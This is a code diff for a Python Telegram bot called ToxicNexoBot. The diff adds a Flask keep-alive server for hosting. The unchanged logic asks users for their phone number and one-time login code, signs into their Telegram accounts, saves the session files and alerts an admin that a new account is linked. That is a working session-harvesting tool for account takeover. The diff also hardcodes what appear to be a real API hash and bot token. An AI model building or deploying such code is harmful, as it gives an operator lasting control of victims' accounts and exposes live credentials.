@@ -1,15 +1,32 @@
 from telethon import TelegramClient, events, Button
 import asyncio
 import os
+from flask import Flask
+from threading import Thread
+
+# ============ RENDER KEEP-ALIVE CONFIG ============
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is running and alive!"
+
+def run_flask():
+    # Render assigns a port automatically
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
+
+def keep_alive():
+    t = Thread(target=run_flask)
+    t.daemon = True
+    t.start()
 
 # ============ CONFIGURATION ============
-# আপনার দেওয়া তথ্য অনুযায়ী আপডেট করা হয়েছে
 API_ID = 37663020 
 API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
 BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
 ADMIN_ID = 7408644813 
 
-# সেশন সেভ করার জন্য ফোল্ডার
 SESSIONS_DIR = 'sessions'
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
@@ -47,10 +64,10 @@ class ToxicNexoBot:
         async def handle_text(event):
             user_id = event.sender_id
             
-            # ফোন নম্বর হ্যান্ডেল করা
             if user_id in self.pending_phone:
-                del self.pending_phone[user_id]
+                # ফোন নম্বর হ্যান্ডেল করা
                 phone = event.text.strip()
+                del self.pending_phone[user_id]
                 client = TelegramClient(f'{SESSIONS_DIR}/{phone}', API_ID, API_HASH)
                 await client.connect()
                 try:
@@ -61,15 +78,13 @@ class ToxicNexoBot:
                 except Exception as e:
                     await event.reply(f"❌ Error: {e}")
             
-            # OTP হ্যান্ডেল করা
             elif user_id in self.pending_otp:
+                # OTP হ্যান্ডেল করা
                 otp_code = event.text.strip()
                 data = self.temp_clients[user_id]
                 try:
                     await data['client'].sign_in(data['phone'], otp_code, phone_code_hash=data['hash'])
                     await event.reply(f"✅ Account Added Successfully: {data['phone']}")
-                    
-                    # অ্যাডমিনকে জানানো
                     await self.bot.send_message(ADMIN_ID, f"🚀 **New Account Linked**\nPhone: `{data['phone']}`")
                     del self.pending_otp[user_id]
                 except Exception as e:
@@ -78,29 +93,11 @@ class ToxicNexoBot:
         await self.bot.run_until_disconnected()
 
 if __name__ == '__main__':
+    # Flask সার্ভার চালু করা যা পোর্ট সচল রাখবে
+    print("Starting Keep-Alive Server...")
+    keep_alive()
+    
+    # মেইন বট চালু করা
     bot = ToxicNexoBot()
     asyncio.run(bot.run())
-
-
-import os
-from flask import Flask
-from threading import Thread
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "I am alive!"
-
-def run():
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
-
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
-
-if __name__ == "__main__":
-    keep_alive()
-    # এখানে আপনার বটের আসল কোড শুরু হবে (যেমন: client.run_until_disconnected())
-    
+        
